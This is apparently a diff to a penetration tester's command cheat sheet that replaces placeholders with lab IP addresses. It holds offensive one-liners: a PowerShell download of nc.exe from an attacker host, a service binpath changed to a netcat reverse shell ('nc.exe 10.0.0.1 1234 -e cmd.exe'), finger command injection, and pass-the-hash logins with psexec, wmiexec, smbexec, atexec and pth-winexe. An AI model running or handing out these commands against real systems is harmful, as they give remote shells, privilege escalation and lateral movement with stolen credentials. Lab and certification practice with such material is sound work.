@@ -114,7 +114,7 @@ sc start filepermsvc
 #Weak Service Permission
 accesschk.exe /accepteula -uwcqv "Authenticated Users" *
 powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.0.0.1/nc.exe', '.\nc.exe') #Grab Windows Binary
-sc config <SERVICENAME> binpath= "<PATH>\nc.exe <IP> <PORT> -e cmd.exe"
+sc config <SERVICENAME> binpath= "<PATH>\nc.exe 10.0.0.1 1234 -e cmd.exe"
 sc start <SERVICENAME>
 or 
 net start <SERVICENAME>
@@ -145,8 +145,8 @@ dig axfr 10.10.10.97 @ns1.test.com
 #FINGER 79
 finger @10.10.10.97
 finger <USER>@10.10.10.97
-finger "|/bin/id@<IP>"
-finger "|/bin/ls -a /<IP>"
+finger "|/bin/id@10.10.10.97"
+finger "|/bin/ls -a /10.10.10.97"
 
 #HTTP 80/8080/443
 feroxbuster -u http://10.10.10.97/ -x php js txt -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --extract-links
@@ -214,9 +214,9 @@ atexec.py <DOMAIN>/<USER>:<PASSWORD>@10.10.10.97 <COMMAND>
 
 #PTH Attack
 psexec.py <DOMAIN>/<USER>@10.10.10.97 -hashes :<NTHASH>
-wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
-smbexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
-atexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
+wmiexec.py <DOMAIN>/<USER>@10.10.10.97 -hashes :<NTHASH>
+smbexec.py <DOMAIN>/<USER>@10.10.10.97 -hashes :<NTHASH>
+atexec.py <DOMAIN>/<USER>@10.10.10.97 -hashes :<NTHASH>
 pth-winexe -U username/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.97 cmd
 
 #161/162 SNMP
